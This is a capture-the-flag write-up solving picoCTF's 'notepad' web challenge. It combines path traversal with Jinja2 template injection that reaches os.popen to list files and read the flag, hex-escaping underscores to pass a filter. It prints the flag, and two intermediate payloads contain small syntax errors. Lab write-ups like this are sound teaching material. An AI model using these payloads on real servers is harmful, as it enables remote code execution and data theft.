# Solution

Download the and extract notepad.tar file.

```bash
$ curl https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/notepad/notepad.tar -o notepad.tar -L
```

From the Dockerfile, we see that our flag is store in `/app/` folder, and the name has been scrambled. 

```dockerfile
WORKDIR /app
COPY app.py flag.txt ./
COPY templates templates
RUN mkdir /app/static && \
    chmod -R 775 . && \
    chmod 1773 static templates/errors && \
    mv flag.txt flag-$(cat /proc/sys/kernel/random/uuid).tx
```

Let's run the app locally to check it's behavior.

```bash
$ pip install flask
$ flask run
```

We are greeted with a webpage that on user input submitted, will
1. Create a file with the first 128 characters of input + random base64 encoded string
2. Write user input to that file

As the file name is not sanitized. We are able to provide a custom path via directory traversal.

```python
# No sanitization, other than decoding url encoded string, and appending random strings to end of name
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```

Let's try to create a new file in the `templates/errors` folder using the following string `..\templates\errors\test` as our input.

Open `http://localhost:5000/?error=test-{the_random_bytes}` in the browser.

And we should see the following prompt.
```
..\templates\errors\test
```

Okay, since Flask is using Jinja as a template engine, we are able to injection templates and run code.

From the [templates guide](https://flask.palletsprojects.com/en/2.0.x/templating/), we are able to access the following variables

```
config      - current configuration object
request     - current request object
session     - current session object
g           - request bound object for global variables
url_for()   - flask.url_for() function
get_flashed_messages() - flask.get_flashed_messages() function
```

Let's check if this is true **locally** by changing the contents in our `test.html`. to `{{ request }}`.

Access `http://localhost:5000/?error=test` and we are greeted with 

```
<Request 'http://localhost:5000/?error=test1' [GET]>
```

Now all we have to do is to find the name of the `flag.txt` file and print out its contents.

To do that, let's traverse the `request` object.

```python
{{ request.application.__globals__ }}

{'__name__': 'werkzeug.wrappers.request', '__doc__': None, '__package__': 'werkzeug.wrappers', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7faefe1ae670>, '__spec__': ModuleSpec(name='werkzeug.wrappers.request', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7faefe1ae670>, origin='/home/alex/.virtualenvs/picoCTF/lib/python3.8/site-packages/werkzeug/wrappers/request.py'), '__file__': '/home/alex/.virtualenvs/picoCTF/lib/python3.8/site-packages/werkzeug/wrappers/request.py', '__cached__': '/home/alex/.virtualenvs/picoCTF/lib/python3.8/site-packages/werkzeug/wrappers/__pycache__/request.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>
}
```

From the output above, we see that we have access to the global `__import__` function. This allows us to spawn a shell and find the file name.

```
{{ request.application["__globals__"]["__builtins__"]["__import__"]('os').popen('ls -alt').read()}} }}
```

The only problem left is that '_' is not allowed. To circumvent this issue, we convert '_' to it's hex equivalent, which is `\x5f`.

```
{{ request.application["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os').popen('ls -alt'.read()}} }}
```

To make our lives easier, we can also pad the template with characters to prevent the file name from containing url-encoded values.

Final input looks like

```
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa {{request.application["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os').popen('ls -alt').read()}}
```

Submit the input to the challenge website to get the name of flag file.

```
flag-c8f5526c-4122-4578-96de-d7dd27193798.txt
```

Finally, we can print out the contents of the file with the input below.

```
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa {{request.application["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os').popen('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt').read()}}
```

And our flag is `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`.

Solution was inspired from [Diana Lin](https://activities.tjhsst.edu/csc/writeups/picomini-redpwn-notepad) and with further resources from [SecGus](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)